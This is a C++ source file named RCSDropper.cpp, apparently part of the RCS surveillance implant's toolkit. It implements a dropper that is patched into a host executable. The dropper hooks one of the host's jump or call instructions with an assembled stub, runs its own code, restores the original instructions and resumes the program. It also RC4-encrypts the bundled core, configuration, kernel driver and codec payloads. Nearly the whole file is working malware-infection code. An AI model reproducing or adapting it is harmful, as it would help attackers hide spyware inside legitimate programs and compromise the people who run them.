/*
 * RCSDropper.cpp
 *
 *  Created on: May 11, 2010
 *      Author: daniele
 */

#include "RCSDropper.h"

#include <algorithm>
#include <iomanip>
#include <iostream>
using namespace std;

#include <boost/algorithm/string.hpp>
#include <boost/filesystem/fstream.hpp>
#include <boost/filesystem.hpp>
#include <boost/format.hpp>
#include <boost/random.hpp>
#include <boost/regex.hpp>
#include <boost/shared_array.hpp>

#include <AsmJit.h>

#include "Common.h"
#include "CookerVersion.h"
#include "DropperHeader.h"
#include "hook.h"

static void rc4crypt(
        const unsigned char *key,
        size_t keylen,
        unsigned char *data,
        size_t data_len);

void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
{
    (void) VA;
    
    AsmJit::Assembler stub;
    
    switch (hookedInstruction_.d.Instruction.BranchType) {
        case JmpType:
        {
            // account for initial 4 bytes containing address of next byte
            DWORD codeVA = stubVA + sizeof(DWORD);
            DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
            std::cout << "Stage1 stub: call 0x" << hex << codeVA << dec << std::endl;
            stub.call( (void*) addr );
        }
        break;
        case CallType:
        {
            cout << "Stage1 stub: call dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
            stub.call(AsmJit::dword_ptr_abs( (void*)stubVA ));
        }
        break;
    }
    
    // save original code
    DropperHeader* h = header();
    h->stage1.VA = hookedInstruction_.d.VirtualAddr;
    h->stage1.size = stub.codeSize();
    h->stage1.offset = offset_.stage1 - offset_.header; // offsets are header based here
    memcpy( ptr_( offset_.stage1 ), ptr, h->stage1.size);
    
    stub.relocCode((void*) ptr);
}

// XXX need of calling for size of stub makes restoreStub messy ... refactor!!

std::size_t RCSDropper::restoreStub(DWORD currentVA) {
    unsigned char* restore = ptr_(offset_.restore);
    DropperHeader* h = NULL;
    DWORD headerVA, dropperVA, stage1VA;
    
    if (currentVA == 0) {
        headerVA = 0xFFFFFFFF;
        dropperVA = 0xFFFFFFFF;
        stage1VA = 0xFFFFFFFF;
    } else {
        h = header();
        headerVA = currentVA + offset_.header;
        dropperVA = headerVA + sizeof (DropperHeader);
        stage1VA = h->stage1.VA;

        DEBUG_MSG(D_VERBOSE, "Current  VA : %08x", currentVA);
        DEBUG_MSG(D_VERBOSE, "Header   VA : %08x", headerVA);
        DEBUG_MSG(D_VERBOSE, "Dropper  VA : %08x", dropperVA);
        DEBUG_MSG(D_VERBOSE, "Stage1   VA : %08x", stage1VA);
    }

    DWORD restoreVA = currentVA + sizeof(DWORD);
    
    AsmJit::Assembler stub;
    stub.data(&restoreVA, sizeof(DWORD));
    stub.pushfd();
    stub.pushad();
    stub.push(headerVA);
    stub.call(((DWORD) restore) + (dropperVA - currentVA));
    stub.popad();
    stub.popfd();
    stub.jmp(((DWORD) restore) + (stage1VA - currentVA));
    
    stub.relocCode((void*) restore);

    return stub.codeSize();
}

void RCSDropper::loadFile(bf::path filePath) {
    std::size_t fileSize = bf::file_size(filePath);
    char* data = (char*) ptr_(offset_.header);

    bf::ifstream rcs_file(filePath, ios::in | ios::binary);
    rcs_file.read(data, fileSize);
    rcs_file.close();
}

void RCSDropper::generateKey() {
    // TODO generate RC4 key
    boost::mt19937 rng(static_cast<unsigned int> (std::time(0)));
    boost::uniform_smallint<> uni_dist(0, 255);
    boost::variate_generator<boost::mt19937&, boost::uniform_smallint<> > uni(rng, uni_dist);

    DropperHeader* h = header();
    for (int i = 0; i < RC4KEYLEN; ++i)
        h->rc4key[i] = static_cast<unsigned short int> (uni());

    std::ostringstream skey;
    for (int i = 0; i < RC4KEYLEN; ++i)
        skey << hex << static_cast<unsigned short int> (h->rc4key[i]);
    //DEBUG_MSG(D_EXCESSIVE, "RC4 Key : %s", skey.str().c_str());
}

void RCSDropper::encrypt() {
    DropperHeader* h = header();

    // TODO encrypt files
    DEBUG_MSG(D_DEBUG, "Encrypting core           ... %d", (DWORD) h->files.core.size);
    encryptFile_(h->files.core);

    DEBUG_MSG(D_DEBUG, "Encrypting core (64bit)   ... %d", (DWORD) h->files.core64.size);
    encryptFile_(h->files.core64);

    DEBUG_MSG(D_DEBUG, "Encrypting config         ... %d", (DWORD) h->files.config.size);
    encryptFile_(h->files.config);

    DEBUG_MSG(D_DEBUG, "Encrypting driver         ... %d", (DWORD) h->files.driver.size);
    encryptFile_(h->files.driver);

    DEBUG_MSG(D_DEBUG, "Encrypting driver (64bit) ... %d", (DWORD) h->files.driver64.size);
    encryptFile_(h->files.driver64);

    DEBUG_MSG(D_DEBUG, "Encrypting codec          ... %d", (DWORD) h->files.codec.size);
    encryptFile_(h->files.codec);
}

void RCSDropper::encryptFile_(DataSectionCryptoPack& file) {
    if (file.size != 0) {
        DropperHeader* h = header();
        rc4crypt(
                (unsigned char*) h->rc4key,
                RC4KEYLEN,
                (unsigned char*) h + file.offset,
                file.size
                );
    }
}

RCSDropper::RCSDropper(const char* filepath) {
    // calculate final size
    bf::path p = filepath;

    if (!bf::exists(p))
        throw std::runtime_error(filepath);

    std::size_t fileSize = bf::file_size(filepath);
    size_ = fileSize + 2048;

    // create buffer and zero it out
    data_.insert(data_.begin(), size_, 0);

    // calculate all offsets
    offset_.restore = 0;

    offset_.header = std::max<std::size_t > (restoreStub(0), 32);
    DEBUG_MSG(D_DEBUG, "Size of restore stub: %d", offset_.header);
    // XXX magic number!
    DEBUG_MSG(D_DEBUG, "Offset to header:     %d", offset_.header);
    offset_.stage1 = offset_.header + fileSize;

    loadFile(filepath);

    if (verifyCookerVersion() == false) {
        std::string version = header()->version;
        if (version.empty())
            version = "<unknown>";
        throw InvalidCookerVersion(version, printable_required_cooker_version);
    }

    generateKey();
    encrypt();
}

bool RCSDropper::verifyCookerVersion() {
    DropperHeader* h = header();
    std::string version = h->version;
    boost::trim_left(version);
    boost::trim_right(version);

    DEBUG_MSG(D_INFO, "Dropper built with cooker version: %s", version.c_str());

    try {

        if (boost::regex_match(version, required_cooker_version))
            return true;

    } catch (boost::regex_error& e) {
        DEBUG_MSG(D_DEBUG, "Found version: %s", version.c_str());
        DEBUG_MSG(D_WARNING, "Required cooker version is not a valid regular expression: %d", e.what());
        return false;
    } catch (...) {
        return false;
    }

    DEBUG_MSG(D_ERROR, "Dropper built with an invalid cooker version, found %s required %s",
            version.c_str(),
            printable_required_cooker_version.c_str());

    return false;
}

RCSDropper::~RCSDropper() {
    // TODO Auto-generated destructor stub
}

void rc4crypt(const unsigned char *key, size_t keylen,
        unsigned char *data, size_t data_len) {
    unsigned int i, j, k;
    unsigned char *pos;
    unsigned char S[256];
    size_t kpos;
    size_t skip = 0;

    /* Setup RC4 state */
    for (i = 0; i < 256; i++)
        S[i] = i;
    j = 0;
    kpos = 0;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[kpos]) & 0xff;
        kpos++;
        if (kpos >= keylen)
            kpos = 0;
        S_SWAP(i, j);
    }

    /* Skip the start of the stream */
    i = j = 0;
    for (k = 0; k < skip; k++) {
        i = (i + 1) & 0xff;
        j = (j + S[i]) & 0xff;
        S_SWAP(i, j);
    }

    /* Apply RC4 to data */
    pos = data;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) & 0xff;
        j = (j + S[i]) & 0xff;
        S_SWAP(i, j);
        *pos++ ^= S[(S[i] + S[j]) & 0xff];
    }
}
